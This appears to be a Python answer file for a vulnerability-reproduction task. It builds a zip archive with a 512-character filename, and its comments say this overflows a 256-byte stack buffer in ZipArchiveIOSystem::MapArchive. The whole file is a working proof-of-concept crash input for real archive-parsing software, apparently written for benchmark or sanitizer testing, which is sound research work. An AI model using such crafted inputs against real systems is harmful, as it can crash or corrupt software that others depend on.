import zipfile
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # The vulnerability is a stack buffer overflow in ZipArchiveIOSystem::MapArchive.
            # It copies the filename from the zip entry into a fixed 256-byte stack buffer.
            # Providing a filename longer than 256 bytes triggers the overflow.
            # We use 512 bytes to ensure the stack is corrupted/sanitizer is triggered.
            filename = "A" * 512
            zf.writestr(filename, b"")
        return buffer.getvalue()